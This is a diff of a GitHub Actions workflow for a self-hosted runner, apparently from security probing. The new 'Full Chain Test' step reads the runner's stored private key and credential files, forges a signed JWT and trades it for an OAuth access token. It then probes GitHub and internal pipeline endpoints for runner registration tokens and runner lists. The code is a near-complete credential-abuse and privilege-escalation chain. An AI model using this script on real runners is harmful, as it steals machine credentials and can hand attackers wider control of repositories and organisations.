@@ -4,7 +4,7 @@ jobs:
   find:
     runs-on: self-hosted
     steps:
-      - name: Fix Time Issue
+      - name: Full Chain Test
         run: |
           RUNNER_BASE="/Users/delledoxsecurity/github/d/actions-runner"
           
@@ -20,10 +20,8 @@ jobs:
           
           with open('$RUNNER_BASE/.credentials_rsaparams', 'r', encoding='utf-8-sig') as f:
               params = json.load(f)
-          
           with open('$RUNNER_BASE/.credentials', 'r', encoding='utf-8-sig') as f:
               creds = json.load(f)
-              
           with open('$RUNNER_BASE/.runner', 'r', encoding='utf-8-sig') as f:
               runner = json.load(f)
           
@@ -32,78 +30,30 @@ jobs:
               return int.from_bytes(base64.urlsafe_b64decode(b64), 'big')
           
           # Build RSA key
-          p = b64_to_int(params['p'])
-          q = b64_to_int(params['q'])
-          d = b64_to_int(params['d'])
-          n = b64_to_int(params['modulus'])
-          e = b64_to_int(params['exponent'])
-          dp = b64_to_int(params['dp'])
-          dq = b64_to_int(params['dq'])
-          iq = b64_to_int(params['inverseQ'])
-          
           private_numbers = RSAPrivateNumbers(
-              p=p, q=q, d=d,
-              dmp1=dp, dmq1=dq, iqmp=iq,
-              public_numbers=RSAPublicNumbers(e=e, n=n)
+              p=b64_to_int(params['p']),
+              q=b64_to_int(params['q']),
+              d=b64_to_int(params['d']),
+              dmp1=b64_to_int(params['dp']),
+              dmq1=b64_to_int(params['dq']),
+              iqmp=b64_to_int(params['inverseQ']),
+              public_numbers=RSAPublicNumbers(
+                  e=b64_to_int(params['exponent']),
+                  n=b64_to_int(params['modulus'])
+              )
           )
           private_key = private_numbers.private_key(default_backend())
           
           client_id = creds['data']['clientId']
           auth_url = creds['data']['authorizationUrl']
+          server_url = runner['serverUrl']
+          github_url = runner['gitHubUrl']
+          agent_id = runner['agentId']
+          pool_id = runner['poolId']
           
-          # Debug time
+          print('=== STEP 1: Generate JWT ===')
           now = int(time.time())
-          print('Current Unix Time:', now)
-          print('Current Time UTC:', time.gmtime(now))
-          
-          # Try without iat - just exp
-          # Server might be calculating lifetime differently
           payload = {
-              'sub': client_id,
-              'iss': client_id,
-              'aud': auth_url,
-              'exp': now + 270,
-              'jti': base64.b64encode(str(now).encode()).decode()
-          }
-          
-          print('Payload:', json.dumps(payload, indent=2))
-          
-          client_assertion = jwt.encode(
-              payload,
-              private_key,
-              algorithm='RS256'
-          )
-          print('JWT Generated!')
-          
-          # Decode to verify
-          header = jwt.get_unverified_header(client_assertion)
-          print('JWT Header:', header)
-          
-          form_data = urllib.parse.urlencode({
-              'grant_type': 'client_credentials',
-              'client_assertion_type': 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer',
-              'client_assertion': client_assertion,
-              'client_id': client_id
-          }).encode()
-          
-          print('\n=== ATTEMPT 1: No iat field ===')
-          try:
-              req = urllib.request.Request(
-                  auth_url,
-                  method='POST',
-                  data=form_data,
-                  headers={
-                      'Content-Type': 'application/x-www-form-urlencoded',
-                      'Accept': 'application/json'
-                  }
-              )
-              with urllib.request.urlopen(req) as resp:
-                  print('SUCCESS:', resp.read().decode())
-          except urllib.error.HTTPError as e:
-              print(f'HTTP {e.code}:', e.read().decode())
-          
-          # Try with nbf
-          payload2 = {
               'sub': client_id,
               'iss': client_id,
               'aud': auth_url,
@@ -112,71 +62,95 @@ jobs:
               'jti': str(now)
           }
           
-          client_assertion2 = jwt.encode(
-              payload2,
-              private_key,
-              algorithm='RS256'
+          client_assertion = jwt.encode(
+              payload, private_key, algorithm='RS256'
           )
+          print('JWT Generated!')
           
-          form_data2 = urllib.parse.urlencode({
+          print('\n=== STEP 2: OAuth2 Token Exchange ===')
+          form_data = urllib.parse.urlencode({
               'grant_type': 'client_credentials',
               'client_assertion_type': 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer',
-              'client_assertion': client_assertion2,
+              'client_assertion': client_assertion,
               'client_id': client_id
           }).encode()
           
-          print('\n=== ATTEMPT 2: With nbf instead of iat ===')
-          try:
-              req2 = urllib.request.Request(
-                  auth_url,
-                  method='POST',
-                  data=form_data2,
-                  headers={
-                      'Content-Type': 'application/x-www-form-urlencoded',
-                      'Accept': 'application/json'
-                  }
-              )
-              with urllib.request.urlopen(req2) as resp:
-                  print('SUCCESS:', resp.read().decode())
-          except urllib.error.HTTPError as e:
-              print(f'HTTP {e.code}:', e.read().decode())
-              
-          # Try with very small window
-          payload3 = {
-              'sub': client_id,
-              'iss': client_id,
-              'aud': auth_url,
-              'iat': now,
-              'exp': now + 60,  # just 1 minute
-              'jti': str(now) + 'v3'
-          }
-          
-          client_assertion3 = jwt.encode(
-              payload3,
-              private_key,
-              algorithm='RS256'
+          req = urllib.request.Request(
+              auth_url,
+              method='POST',
+              data=form_data,
+              headers={
+                  'Content-Type': 'application/x-www-form-urlencoded',
+                  'Accept': 'application/json'
+              }
           )
+          with urllib.request.urlopen(req) as resp:
+              token_response = json.loads(resp.read().decode())
+              access_token = token_response['access_token']
+              token_type = token_response['token_type']
+              expires_in = token_response['expires_in']
+              print(f'Access Token Obtained! Expires in: {expires_in}s')
           
-          form_data3 = urllib.parse.urlencode({
-              'grant_type': 'client_credentials',
-              'client_assertion_type': 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer',
-              'client_assertion': client_assertion3,
-              'client_id': client_id
-          }).encode()
+          print('\n=== STEP 3: Try All Endpoints ===')
           
-          print('\n=== ATTEMPT 3: 1 minute expiry ===')
-          try:
-              req3 = urllib.request.Request(
-                  auth_url,
-                  method='POST',
-                  data=form_data3,
-                  headers={
-                      'Content-Type': 'application/x-www-form-urlencoded',
-                      'Accept': 'application/json'
-                  }
-              )
-              with urllib.request.urlopen(req3) as resp:
-                  print('SUCCESS:', resp.read().decode())
-          except urllib.error.HTTPError as e:
-              print(f'HTTP {e.code}:', e.read().decode())
+          endpoints = [
+              # GitHub REST API - Repo level
+              ('REPO REG TOKEN REST', 'POST',
+               'https://api.github.com/repos/${{ github.repository }}/actions/runners/registration-token',
+               {'Authorization': f'Bearer {access_token}',
+                'Accept': 'application/vnd.github.v3+json',
+                'Content-Length': '0'}),
+               
+              # GitHub REST API - Org level  
+              ('ORG REG TOKEN REST', 'POST',
+               'https://api.github.com/orgs/${{ github.repository_owner }}/actions/runners/registration-token',
+               {'Authorization': f'Bearer {access_token}',
+                'Accept': 'application/vnd.github.v3+json',
+                'Content-Length': '0'}),
+                
+              # Internal Pipeline API
+              ('PIPELINE API REG TOKEN', 'POST',
+               f'{server_url}_apis/distributedtask/pools/{pool_id}/agentregistrationrequests',
+               {'Authorization': f'Bearer {access_token}',
+                'Accept': 'application/json',
+                'Content-Length': '0'}),
+                
+              # Internal Pipeline API - Token endpoint
+              ('PIPELINE TOKEN ENDPOINT', 'POST',
+               f'{server_url}_apis/distributedtask/pools/{pool_id}/agentregistrationtoken',
+               {'Authorization': f'Bearer {access_token}',
+                'Accept': 'application/json',
+                'Content-Length': '0'}),
+                
+              # List runners to verify access
+              ('LIST REPO RUNNERS', 'GET',
+               'https://api.github.com/repos/${{ github.repository }}/actions/runners',
+               {'Authorization': f'Bearer {access_token}',
+                'Accept': 'application/vnd.github.v3+json'}),
+                
+              # GitHub URL based endpoint
+              ('GITHUB URL ENDPOINT', 'POST',
+               f'{github_url}/_apis/distributedtask/pools/{pool_id}/agentregistrationrequests',
+               {'Authorization': f'Bearer {access_token}',
+                'Accept': 'application/json',
+                'Content-Length': '0'}),
+          ]
+          
+          for name, method, ep, headers in endpoints:
+              print(f'\n--- {name} ---')
+              print(f'URL: {ep}')
+              try:
+                  reg_req = urllib.request.Request(
+                      ep,
+                      method=method,
+                      data=b'' if method == 'POST' else None,
+                      headers=headers
+                  )
+                  with urllib.request.urlopen(reg_req) as reg_resp:
+                      response = reg_resp.read().decode()
+                      print(f'SUCCESS {reg_resp.status}:', response)
+              except urllib.error.HTTPError as e:
+                  print(f'HTTP {e.code}:', e.read().decode()[:200])
+              except Exception as ex:
+                  print('Error:', str(ex))
           "
